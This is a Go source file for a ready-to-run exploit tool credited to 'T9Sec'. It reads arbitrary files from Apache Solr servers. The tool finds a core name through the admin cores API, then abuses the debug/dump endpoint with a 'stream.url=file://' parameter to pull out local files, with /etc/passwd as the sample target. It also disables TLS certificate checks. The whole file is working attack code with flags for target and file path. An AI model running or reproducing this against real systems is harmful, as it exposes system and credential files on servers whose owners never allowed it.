package main

import (
	"fmt"
	"net/http"
	"io/ioutil"
	"crypto/tls"
	"time"
	"regexp"
	"strings"
	"flag"
)

var t = &http.Transport{
    TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
}

var c = &http.Client{
    Transport: t,
    Timeout:   5 * time.Second,
}

func main(){

	var host, file string
	flag.StringVar(&host,"u","","URL : http://127.0.0.1")
	flag.StringVar(&file,"f","","File: /etc/passwd")
	flag.Parse()

	if host == "" || file == ""{
		fmt.Println(`
███████╗ ██████╗ ██╗     ██████╗ 
██╔════╝██╔═══██╗██║     ██╔══██╗
███████╗██║   ██║██║     ██████╔╝
╚════██║██║   ██║██║     ██╔══██╗
███████║╚██████╔╝███████╗██║  ██║
╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
Apache Solr 任意文件读取  BY:T9Sec     
`)
	}else{
		poc(host,file)
	}
	
}


func poc(url , payload string){
    
    url = strings.TrimRight(url,"/")
    geturl := url+"/solr/admin/cores?indexInfo=false&wt=json"

    req, err := http.NewRequest("GET", geturl, nil)
    if err != nil {
        return
    }
    req.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36")
    
    r, err := c.Do(req)
    if err != nil {
        return
    }
    defer r.Body.Close()
    body, err := ioutil.ReadAll(r.Body)
    if err != nil {
        return
    }

    if r.StatusCode == 200{
    	result := string(body)
	    reg := regexp.MustCompile(`"name":"(?s:(.*?))"`)
	    name := reg.FindAllStringSubmatch(result,-1)
	    path := name[0][1]
	    
	    exp(url,path,payload)
    }else{
    	fmt.Println("fail");
    }
    
}

func exp(url, path, payload string){
	url = url+"/solr/"+path+"/debug/dump?param=ContentStreams"
	payload = "stream.url=file://"+payload

    r, err := c.Post(
		url,
		"application/x-www-form-urlencoded",
		strings.NewReader(payload))
    if err != nil {
        return
    }
    defer r.Body.Close()
    body, err := ioutil.ReadAll(r.Body)
    if err != nil {
        return
    }
    
    if r.StatusCode == 200{
	    result := string(body)
	    reg := regexp.MustCompile(`"stream":"(.*?)"`)
	    name := reg.FindAllStringSubmatch(result,-1)
	    fileText := name[0][1]

	    fmt.Println(strings.Replace(fileText,"\\n","\n",-1))
	}else{
    	fmt.Println("fail");
    }
}